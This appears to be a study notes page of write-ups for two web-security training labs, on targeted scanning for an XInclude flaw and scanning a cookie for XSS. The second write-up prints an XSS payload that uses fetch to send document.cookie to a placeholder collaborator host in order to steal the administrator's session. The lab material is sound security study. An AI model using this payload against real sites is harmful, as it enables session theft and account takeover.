---
layout: default
title: "Essential Skills Labs"
parent: "Web Application"
nav_order: 10
---

## Lab: Discovering vulnerabilities quickly with targeted scanning
Run a scan, and see that it is an XInclude vuln, which can be found in the XXE notes or here on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#xinclude-attacks)

![](/assets/Images/Essential%20Skills%20Labs/xinclude2.png)

## Lab: Scanning non-standard data structures
Basically you are looking are for any non-standard data structures in the requests, which turns out to be a cookie you see in the `GET /my-account?id=wiener` request. It looks like `wiener%3a<blah>` which when URL-decoded is `wiener:<blah>`
- Highlight `wiener` and click `Scan selected insertion point` - it will be `Audit`. 
- It says there is XSS and it looks like: `'"><svg/onload=fetch...`
	- Didn't work initially because the request showed two cookies, probably because I was screwing around too much
- But I eventually got this: 
![](/assets/Images/Essential%20Skills%20Labs/non-standard_data_structures_scan.png)
- `'%22%3e%3csvg%2fonload%3dfetch%60%2f%2fgcwxwkyw1nwnu10kmi9m5ezcy34wsmge62xski87%5c.oastify.com%60%3e`
- which decodes to: 
```
'"><svg/onload=fetch`//gcwxwkyw1nwnu10kmi9m5ezcy34wsmge62xski87\.oastify.com`>
```
- You must replaces the collaborator payload with a new one: 
```
'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID
```
- This will encode the `administrator`'s cookie and send it in the **request**:
![](/assets/Images/Essential%20Skills%20Labs/non-standard_data_structures_admin_cookie.png)
- URL decode and you see the cookie. 
